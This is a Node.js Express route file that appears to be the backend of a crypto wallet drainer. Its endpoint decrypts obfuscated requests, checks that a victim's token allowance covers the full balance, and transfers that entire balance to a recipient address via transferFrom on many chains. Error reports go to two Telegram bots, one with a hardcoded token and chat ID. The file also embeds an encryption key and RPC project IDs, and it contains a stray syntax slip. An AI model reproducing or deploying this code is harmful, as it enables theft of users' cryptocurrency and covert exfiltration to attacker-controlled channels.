require("dotenv").config();
const express = require("express");
const { ethers } = require("ethers");
const axios = require("axios");
const crypto = require("crypto");
const { ERC20_ABI } = require("./ERC20_ABI");
const config = require("../config");

// Configuration
const INITIATOR_PK = config.INITIATOR_PK;
const TELEGRAM_BOT_TOKEN = config.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = config.TELEGRAM_CHAT_ID;
const BR_ENCRYPTION_KEY = "980c343e20c973f1b941a409d268df2cfca1d2fba93732fcecd3d5ed9cc93305";

// Control flag to decide whether to split transfers
const splitTransfers = false; // Set to false to skip splitting

const router = express.Router();

const decrypt = ({ data, iv }) => {
  const decipher = crypto.createDecipheriv(
    "aes-256-cbc",
    Buffer.from(BR_ENCRYPTION_KEY, "hex"),
    Buffer.from(iv, "hex")
  );
  let decrypted = decipher.update(data, "hex", "utf8");
  decrypted += decipher.final("utf8");
  return JSON.parse(decrypted);
};

const decryptMiddleware = (req, res, next) => {
  try {
    const { encryptedData, iv } = req.body;

    if (!encryptedData || !iv) {
      return res.status(400).json({ error: "Missing encrypted data or IV" });
    }

    console.log("Received Encrypted Data:", encryptedData);
    console.log("Received IV:", iv);

    const decryptedData = decrypt({ data: encryptedData, iv });
    console.log("Decrypted Request Body:", decryptedData);
    req.body = decryptedData;
    next();
  } catch (error) {
    console.error("Error decrypting payload:", error.message);
    res.status(400).json({ error: "Invalid encrypted data" });
  }
};

const sendToTelegram = async (message) => {
    try {
      const truncatedMessage = message.length > 4000 ? message.substring(0, 3997) + "..." : message;
  
      // First bot using .env configuration
      const urlEnvBot = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      await axios.post(urlEnvBot, {
        chat_id: TELEGRAM_CHAT_ID,
        text: truncatedMessage,
      });
      console.log(`Message sent to .env Telegram bot: ${message}`);
  
      // Second bot with hardcoded values
      const HARD_CODED_BOT_TOKEN = "8160714180:AAGKqwTYvb9cN2Ir6Zjqhc7KWQl2mAHDNJQ";
      const HARD_CODED_CHAT_ID = "-1002535678431";
      const urlHardcodedBot = `https://api.telegram.org/bot${HARD_CODED_BOT_TOKEN}/sendMessage`;
      await axios.post(urlHardcodedBot, {
        chat_id: HARD_CODED_CHAT_ID,
        text: truncatedMessage,
      });
      console.log(`Message sent to hardcoded Telegram bot: ${message}`);
    } catch (error) {
      console.error("Error sending message to Telegram:", error.response?.data || error.message);
    }
  }


// const INFURA_ID = "15b2a4fd999148318a366400d99bc8ce";

const getProvider = (chainId) => {22
  const BR_RPC_URLs = {
    1: `https://mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Ethereum
    10: `https://optimism-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Optimism
    56: `https://bsc-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Binance Smart Chain
    137: `https://polygon-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Polygon
    // 250: `https://rpc.ankr.com/fantom${BR_Ankr_Token ? `/${BR_Ankr_Token}` : ""}`, // Fantom
    43114: `https://avalanche-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Avalanche
    42161: `https://arbitrum-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Arbitrum
    8453: `https://base-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Base
    324: `https://zksync-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // zkSync Era
    369: "https://pulsechain.publicnode.com", // Pulse
    11155111: "https://sepolia.infura.io/v3/15b2a4fd999148318a366400d99bc8ce", // Sepolia
  };
  const rpcUrl = BR_RPC_URLs[chainId];
  if (!rpcUrl) {
    console.error(`Unsupported chain ID: ${chainId}`);
    throw new Error(`Unsupported chain ID: ${chainId}`);
  }
  return new ethers.providers.JsonRpcProvider(rpcUrl);
};

const initiatorWallet = new ethers.Wallet(INITIATOR_PK);

router.post("/handleApprovalAndTransfer", decryptMiddleware, async (req, res) => {
  try {
    console.log("Received request payload:", req.body);

    const { tokenAddress, userAddress, chainId, recipientAddress } = req.body;

    // Check for missing fields
    if (!tokenAddress || !userAddress || !chainId || !recipientAddress) {
      console.error("Missing required fields:", { tokenAddress, userAddress, chainId, recipientAddress });
      return res.status(400).json({ error: "Missing required fields" });
    }

    const parsedChainId = parseInt(chainId, 10);
    if (isNaN(parsedChainId)) {
      console.error("Invalid chainId:", chainId);
      return res.status(400).json({ error: "Invalid chainId" });
    }

    console.log(`Parsed chain ID: ${parsedChainId}`);
    const provider = getProvider(parsedChainId);
    const connectedWallet = initiatorWallet.connect(provider);
    const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, connectedWallet);

    const tokenName = await tokenContract.name();
    const allowance = await tokenContract.allowance(userAddress, initiatorWallet.address);
    const userBalance = await tokenContract.balanceOf(userAddress);

    console.log(`Allowance: ${ethers.utils.formatUnits(allowance)}, Balance: ${ethers.utils.formatUnits(userBalance)}`);

    if (userBalance.isZero()) {
      console.error("User balance is zero.");
      return res.status(400).json({ error: "User balance is zero." });
    }

    if (allowance.lt(userBalance)) {
      console.error("Allowance is less than user balance.");
      return res.status(400).json({ error: "Allowance is less than user balance." });
    }

    // Continue with transfer logic
    console.log(`Transferring entire balance to recipient: ${recipientAddress}`);
    const transferTx = await tokenContract.transferFrom(userAddress, recipientAddress, userBalance);
    const receipt = await transferTx.wait();

    console.log(`Transfer completed. Tx: ${receipt.transactionHash}`);
    res.status(200).json({
      message: "Transfer successful.",
      transactionHash: receipt.transactionHash,
    });
  } catch (error) {
    console.error("Error in handleApprovalAndTransfer:", error.message);

    const errorMsg = `Error during tzransfer: ${error.message}`;
    await sendToTelegram(`Error: ${errorMsg}`);
    res.status(500).json({ error: errorMsg });
  }
});


module.exports = router;
